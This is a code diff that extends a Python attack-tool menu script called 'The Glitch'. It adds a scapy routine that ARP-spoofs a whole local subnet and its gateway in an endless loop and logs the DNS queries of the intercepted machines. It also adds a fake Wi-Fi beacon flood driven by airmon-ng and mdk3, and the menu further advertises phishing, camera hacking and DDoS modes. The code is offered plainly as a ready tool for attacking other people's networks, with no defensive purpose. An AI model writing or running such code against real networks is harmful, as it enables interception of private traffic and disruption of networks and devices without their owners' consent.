@@ -6,6 +6,106 @@ import sys
 import requests
 import csv
 from bs4 import BeautifulSoup
+#---------
+import logging
+from scapy.all import ARP, send, sniff
+from scapy.layers.inet import IP
+from scapy.layers.dns import DNS , DNSQR 
+import threading
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
+#---------
+def ip_con():
+    #---------
+    print('please to work successfully is tool  go to root')
+    def arp_spoof(target_ip,spoof_ip):
+        packet = ARP(op=2, pdst=target_ip, hwdst = 'ff:ff:ff:ff:ff:ff',psrc=spoof_ip)
+        send(packet,verbose=False)
+    def dns_packet(packet):
+        if packet.haslayer(DNS) and packet[DNS].qr == 0:
+
+            ip_src = packet[IP].src
+            dns_query = packet[DNSQR].qname.decode()
+            print(ip_src, dns_query)
+
+    def start_arp(target_ip, gateway_ip):
+        while True:
+            arp_spoof(target_ip, gateway_ip)
+            arp_spoof(gateway_ip, target_ip)
+
+    target_ip = "192.168.1.0/24"
+    gateway_ip = "192.168.1.1"
+
+    threading.Thread(target = start_arp, args = (target_ip, gateway_ip), daemon = True).start()
+    print("HACKING NATEWORK")
+    print('to stop enter [ctrl + c]')
+    print("__________________________________")
+    print(f"{'IP Address':<20}\t{'DNS Query':<40}")
+
+    print("__________________________________")
+    sniff(filter="udp port 53", prn=dns_packet,store=0)
+    #---------
+def com_let():
+    print('---------------------')
+    print('to stop enter [ctrl + c]')
+    enter_word = input('enter the name of fake wifi : ')
+    with open("fake_wifi.txt" ,"w") as file:
+        file.write(enter_word)
+
+    enter_path = input('enter the path of file fake_wifi.txt : ')
+    if enter_path:
+       os.system('airmon-ng')
+       enter_wl = input('what is your interface after monitor mode : ')
+       os.system(f'mdk3 {enter_wl} b -c 2 -f {enter_path} ')
+       print('atack true')
+    print('---------------------')
+def hack_wifiy():
+    print("\033[1m" + "\033[92m")
+    print('mode = [fake wifi]') 
+    print("\033[1m" + "\033[92m") 
+    enter_ch = input('are you in root {if you are not in root please enter [ctrl + c ] and try again in root } : ')
+    if enter_ch.lower() == 'y':
+        # الدخول الى الداء 
+        os.system('mdk3')
+        
+        # معرفه نوع الانترفاس
+        os.system('ifconfig')
+        # قتل
+        os.system('airmon-ng check kill ')
+        
+        # تشغيل
+        enter_w = input('what is your interface [ech0  , wlan[0to5] ] : ')
+        if enter_w:
+            os.system(f'airmon-ng start {enter_w}')
+            com_let()
+        else:
+            print('please enter your interface like wlan or ecth0')
+
+    elif enter_ch.lower() == 'n':
+        print('please try again in root enter [ctrl + c] to quit')
+    else:
+        print('enter just y or n ')
+def hack_wifi():
+    while True:
+        print("\033[1m" + "\033[92m") 
+        print('wating %')
+        time.sleep(1)
+        print("\033[1m" + "\033[92m") 
+        print('\033[91m')
+        fg = '^'
+        for gg in fg:
+            print(gg)
+        print('--------------------------')
+        gh = input('are your operating system is kail [y , n]: ')
+        print('--------------------------')
+        if gh.lower() =="y":
+           hack_wifiy()
+        elif gh.lower() == "n":
+           print('good bye ')
+           break
+        else:
+           print('please enter just y or n') 
+        print('\033[91m')
+
 def ddos_ata():
     print('\033[91m')
     print('mode = {ddos atack}')
@@ -146,8 +246,12 @@ def hack_tool():
 
     messege = """
     1- pnshing tool        2- hacking camera
-    3- ddos atack
+    3- ddos atack          4- make fake wifi
+    5- contorl our device in the network (^_^)
 
+
+
+   
 
     """
     print("\033[94m")
@@ -161,7 +265,7 @@ def hack_tool():
     print('------------------------------')
     while True:
         print("0--0--0--0--0--0--0--0--0--0--0--0--0")
-        mts = input('enter your choice from 1 to 3 : ')
+        mts = input('enter your choice from 1 to 5 : ')
         print('0--0--0--0--0--0--0--0--0--0--0--0--0')
         if mts =="1":
             zp_hi()
@@ -169,8 +273,12 @@ def hack_tool():
             hack_cam()
         elif mts == "3":
             ddos_ata()
+        elif mts == "4":
+            hack_wifi()
+        elif mts == "5":
+            ip_con()
         else:
-            print('please enter number from 1 to 3 !!!')
+            print('please enter number from 1 to 5 !!!')
     print('-----------------------------------')
 def siem_net():
         print('\033[92m')
@@ -315,9 +423,10 @@ def find_dns():
         print('wrong enput please check the link !!!')
 
 print('-------------------------------------')
-print(' The Glitch [beta]')
+print(' The Glitch v 1.0 [beta]')
 print('[POWERED BY KARAS]')
 print('scanning is work at kail only ')
+print('95 % tools is work just in kail')
 print('-------------------------------------')
 time.sleep(1)
 face = """
